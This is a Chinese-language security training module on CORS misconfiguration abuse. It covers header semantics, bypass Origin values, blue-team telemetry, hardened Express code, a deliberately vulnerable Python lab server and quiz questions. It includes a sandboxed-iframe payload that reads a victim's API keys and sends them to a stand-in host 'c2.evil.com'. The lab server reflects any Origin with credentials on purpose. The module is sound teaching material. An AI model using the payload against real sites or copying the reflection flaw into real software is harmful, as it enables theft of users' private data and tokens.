# R14.5 跨來源資源共享 (CORS) 信任濫用分析 (Cross-Origin Resource Sharing Trust Abuse)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**跨來源資源共享 (CORS) 信任濫用** 發生於伺服器錯誤配置跨域存取控制標頭時。其本質為：**「瀏覽器同源政策 (SOP) 預設禁止跨站讀取敏感回應；CORS 旨在提供受控的鬆綁機制，但當伺服器盲目信任任意傳入的 `Origin` 標頭或配置不嚴謹的正則比對，並開啟 `Access-Control-Allow-Credentials: true` 時，攻擊者可建立惡意網頁，利用受害者的登入憑證跨域讀取敏感個資、API 金鑰與私人資料」**。

```
[受害者瀏覽器] ── 1. 造訪攻擊者網頁 (evil.com)
      │
      ├── 2. 前端 JS 發起跨域請求：fetch('https://api.target.com/me', {credentials: 'include'})
      ▼
[目標伺服器 (api.target.com)]
      │
      ├── 3. 盲目反射：Access-Control-Allow-Origin: https://evil.com
      ├── 4. 允許憑證：Access-Control-Allow-Credentials: true
      ▼
[受害者瀏覽器 (檢查 CORS 標頭通過)]
      │
      ▼ 5. 解除 SOP 阻擋！evil.com 前端 JS 成功讀取 /me 完整 JSON 回應！
[攻擊者 C2 伺服器] ◄── 6. 偷渡外傳：將讀取到的機密資料發送回 C2 ────────┘
```

### 核心作戰決策與邊界
- **與 CSRF (R14.4) 的致命差異**：
  - **CSRF**：只能單向寫入（盲目觸發操作），**無法讀取伺服器回應**。
  - **CORS 弱點**：透過讀取權限開放，能**雙向讀取目標伺服器的機密資料**（帳戶明細、身分證號、個人隱私）。
- **作戰決策心流**：
  1. **測試 Origin 反射性**：發送自訂 `Origin: https://evil.com`，檢查伺服器是否回傳相同的 `Access-Control-Allow-Origin`。
  2. **確認憑證開關**：檢查是否包含 `Access-Control-Allow-Credentials: true`（若為 `false` 則無法帶 Cookie 讀取私密資料）。
  3. **測試字串比對盲區**：若未全量反射，測試前綴、後綴、未跳脫點號與 `null` 來源。

## 🔬 第一動：底層機制與跨來源存取生命週期 (Mechanics & Handshake)

### 核心 CORS 標頭語意與安全性規範

| 標頭名稱 | 語意與作用 | 致命安全配置 |
| :--- | :--- | :--- |
| **`Access-Control-Allow-Origin` (ACAO)** | 指定允許讀取本回應內容的外部來源網域 | 動態反射任意請求的 `Origin`，或配置過寬之正規表示式 |
| **`Access-Control-Allow-Credentials` (ACAC)** | 宣告瀏覽器是否允許 JavaScript 讀取帶有憑證的回應 | 當 ACAO 為不可信網域時設置為 `true` |
| **`Access-Control-Allow-Methods`** | 預檢請求 (Preflight) 允許的 HTTP 方法 | 放行 `DELETE`、`PUT` 等高危寫入方法 |
| **`Access-Control-Expose-Headers`** | 允許前端 JS 讀取的自訂回應標頭 | 暴露含有 Token 或內部金鑰的自訂標頭 |

> **規範鐵律 (W3C CORS Spec)**：當 `Access-Control-Allow-Credentials` 為 `true` 時，`Access-Control-Allow-Origin` **絕對不允許設定為萬用字元 `*`**（瀏覽器會直接拋出錯誤並阻斷讀取）；因此多數漏洞源於後端「自作聰明」動態反射 Origin。

## ⚡ 第二動：弱點驗證與字典級攻擊向量 (Attack Vectors)

### 核心注入向量速查表

| 模式與繞過手法 | 測試 Origin 構造範例 | 伺服器缺陷成因與突防原理 |
| :--- | :--- | :--- |
| **任意 Origin 反射** | `Origin: https://evil.attacker.com` | 後端代碼直接讀取 `req.headers.Origin` 並填入 ACAO。 |
| **前綴匹配缺陷** | `Origin: https://target.com.evil.com` | 正則使用 `^https://target.com`，未限制結尾邊界。 |
| **後綴匹配缺陷** | `Origin: https://not-target.com` | 正則使用 `target.com$`，未校驗開頭子網域名稱。 |
| **正則未轉義點號** | `Origin: https://targetXcom` (點號匹配任意字元) | 正則寫為 `target.com`，點號 `.` 匹配任意英文字元。 |
| **信任 `null` 來源** | `Origin: null` | 後端為了支援本地檔案 (`file:///`) 將 `null` 列入白名單；攻擊者使用 `<iframe sandbox="allow-scripts">` 產生 `null` 來源。 |
| **子網域接管信任** | `Origin: https://sub.target.com` | 目標盲信所有子網域，但該子網域已指向未領取之 CNAME 或存在 XSS。 |

## 🥷 第三動：防禦規避與日誌鑑識特徵 (Evasion & Telemetry)

- **Sandboxed Iframe 生成 `null` 來源**：
  ```html
  <!-- 攻擊者網站利用沙盒 iframe 發起請求，瀏覽器將強制 Origin 為 null -->
  <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
    <script>
      fetch('https://api.target.com/user/keys', {credentials: 'include'})
        .then(r => r.text())
        .then(data => fetch('https://c2.evil.com/?l=' + btoa(data)));
    </script>
  "></iframe>
  ```
- **鑑識特徵**：
  - **異常 Preflight OPTIONS 激增**：API 端點出現大量來自未知外部網域的 `OPTIONS` 預檢請求。
  - **出站外聯監控**：終端用戶在短時間內連續向企業 API 與未備案的外部 C2 網址發送流量。

## ⚔️ 第四動：紅藍攻防對抗矩陣 (Red vs. Blue Confrontation Matrix)

| 攻擊模式 (Offense) | 藍隊遙測指標 (Blue Telemetry) | 防禦基線反制 (Mitigation Baseline) | 繞過與殘餘考量 (Residual Seam) |
| :--- | :--- | :--- | :--- |
| **任意 Origin 反射竊密** | 存取日誌中 ACAO 包含外部網域 | 實施嚴格靜態網域白名單；禁止動態反射 | 尋找未套用全域 CORS 中介軟體的邊界端點 |
| **Null 來源濫用** | ACAO 回應標頭出現 `null` 數值 | **嚴禁將 `null` 列入允許來源白名單** | 某些本地桌面應用 (Electron) 若未隔離仍受害 |
| **正則邏輯瑕疵** | 請求 Origin 包含變異網域名稱 | 採用標準 URL 解析庫提煉 Host 進行完整匹配 | 忽略連接埠號判定 (`target.com:8080`) |
| **子網域借道** | 合法子網域發起異常高頻讀取 | 避免直接信任 `*.target.com`，縮小至具體 FQDN | 子網域遭接管時防線被整體擊穿 |

## 🛡️ 第五動：安全加固與修復基線 (Hardening & Remediation Baseline)

### 1. 嚴格白名單校驗與 Vary 標頭 (Node.js / Express 範例)
```javascript
const express = require('express');
const app = express();

// 1. 嚴格限定受信任的合法 Origin 白名單集合
const TRUSTED_ORIGINS = new Set([
    'https://www.company.com',
    'https://portal.company.com'
]);

app.use((req, res, next) => {
    const origin = req.headers.origin;
    if (origin && TRUSTED_ORIGINS.has(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
        // 核心細節：動態設置 ACAO 時必須宣告 Vary: Origin，避免快取污染
        res.setHeader('Vary', 'Origin');
    }
    // 嚴格不對未知 Origin 設置任何 ACAO 標頭！
    next();
});
```

### 2. 公開 API 設計原則
若端點為完全公開數據（無須身分認證）：
```http
Access-Control-Allow-Origin: *
# 當允許全域存取時，絕對不開啟憑證支援
# 移除 Access-Control-Allow-Credentials
```

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

### 1. 靶場核心代碼 (`cors_lab.py`，極簡 25 行)
```python
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler

class CORSHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        origin = self.headers.get("Origin", "")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        
        safe = "safe=1" in self.path
        if safe:
            # 安全防禦：嚴格白名單
            if origin == "https://trusted-partner.com":
                self.send_header("Access-Control-Allow-Origin", origin)
                self.send_header("Access-Control-Allow-Credentials", "true")
        else:
            # 缺陷：盲目反射任意 Origin
            if origin:
                self.send_header("Access-Control-Allow-Origin", origin)
                self.send_header("Access-Control-Allow-Credentials", "true")
                
        self.end_headers()
        self.wfile.write(b'{"user": "alice", "api_token": "SECRET_KEY_998811"}\n')

ThreadingHTTPServer(("127.0.0.1", 8145), CORSHandler).serve_forever()
```

### 2. 三步驗證流程

1. **發送帶有惡意 Origin 之跨域請求**：
   ```bash
   curl -i -s "http://127.0.0.1:8145/" -H "Origin: https://evil-attacker.com"
   ```
2. **檢驗回應標頭（確認漏洞）**：
   - 回顯中包含：
     ```http
     Access-Control-Allow-Origin: https://evil-attacker.com
     Access-Control-Allow-Credentials: true
     ```
   - 瀏覽器判定合法放行，攻擊者網頁可直接讀取 `api_token`！
3. **驗證加固端點**：
   ```bash
   curl -i -s "http://127.0.0.1:8145/?safe=1" -H "Origin: https://evil-attacker.com"
   # 回應完全不包含任何 Access-Control-* 標頭，瀏覽器嚴格阻斷讀取！
   ```

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. 為什麼不能在配置 `Access-Control-Allow-Credentials: true` 的同時使用 `Access-Control-Allow-Origin: *`？**  
  *分析思路*：W3C CORS 規範明確禁止此種危險組合；若兩者同時存在，瀏覽器直譯器將判定為非法政策，直接阻斷前端 JavaScript 讀取回應，藉此防止全網任意網站濫用受害者的環境憑證。

- [ ] **Q2. 伺服器若信任 `Origin: null`，攻擊者如何構造攻擊環境？**  
  *分析思路*：本地 HTML 檔案或沙盒 iframe（`<iframe sandbox="allow-scripts">`）發出的請求，瀏覽器會將其 Origin 標頭強制設為 `null`；若後端對 `null` 放行並帶憑證，攻擊者即可透過沙盒 iframe 順利完成跨域資料竊取。

- [ ] **Q3. 動態設定 `Access-Control-Allow-Origin` 時，為何必須同時追加 `Vary: Origin` 標頭？**  
  *分析思路*：若缺少 `Vary: Origin`，中繼快取伺服器（CDN/反向代理）可能會將針對攻擊者 Origin 的帶毒回應快取起來，隨後直接吐給其他正常使用者，引發快取污染或阻斷其他合法站點的正常調用。

- [ ] **Q4. 簡述 CORS 信任濫用與 CSRF 在「對目標資料衝擊」上的根本差異？**  
  *分析思路*：CSRF 只能單向偽造狀態變更（寫入操作），無法突破 SOP 讀取回傳內容；CORS 配置失誤則讓跨域攻擊者擁有對目標 API 回應的完整讀取權限，導致私密資料與金鑰全面洩漏。

- [ ] **Q5. 徹底防範 CORS 信任濫用的黃金工程實踐是什麼？**  
  *分析思路*：
  1. 徹底廢止任何對 `Origin` 的字串拼接動態反射；
  2. 嚴格使用精確的 FQDN 集合進行白名單比對；
  3. 嚴禁將 `null` 加入允許清單；
  4. 僅對真正需要憑證的私有端點開放 `Allow-Credentials`。
